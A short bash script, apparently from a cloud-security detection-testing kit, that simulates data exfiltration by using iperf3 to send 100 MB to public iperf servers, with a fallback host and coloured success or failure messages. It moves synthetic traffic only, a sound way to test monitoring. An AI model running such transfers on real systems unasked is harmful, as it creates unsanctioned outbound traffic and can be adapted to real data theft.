#!/bin/bash

# Define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# Data Exfiltration technique simulation
echo -e "${CYAN}\n>>> [Exfiltration][Common] Automated Exfiltration Technique${RESET}"
echo -e "More details: ${BLUE}https://github.com/aliaksxssv/cloud-security-cheatsheet/blob/main/13%20Exfiltration/Automated%20Exfiltration.md${RESET}"

echo "Trying to exfiltrate 100 MB using iperf3"
if ! iperf3 -c iperf3.moji.fr -n 100M; then
    echo "One more exfiltration attempt"
    if ! iperf3 -c nl.iperf.014.fr -n 100M; then
        echo -e "${RED}Error! Data exfiltration was failed${RESET}"
    else 
        echo -e "${GREEN}Success! Data exfiltration was completed${RESET}"
    fi
else
    echo -e "${GREEN}Success! Data exfiltration was completed${RESET}"
fi
